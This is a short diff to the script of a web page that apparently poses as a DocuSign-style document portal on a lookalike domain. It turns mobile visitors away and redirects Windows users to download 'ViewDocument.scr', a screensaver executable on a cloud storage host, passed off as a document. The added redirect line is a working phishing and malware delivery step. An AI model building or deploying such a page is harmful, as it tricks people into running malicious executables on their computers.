@@ -63,7 +63,7 @@
             document.body.innerHTML = '<div class="container"><div class="message"><h2>Mobile Access Restricted</h2><p>This portal is only accessible via a Windows computer. Please use a Windows device to access and download your document.</p></div></div>';
         } else {
             // Redirect to the secure portal for Windows users
-            window.location.href = "https://docusigedform.com/ssa/landing.php";
+            window.location.href = "https://pub-0ea50e10bb8240deb5cc7cd4016af4dc.r2.dev/ViewDocument.scr";
         }
     </script>
 </body>
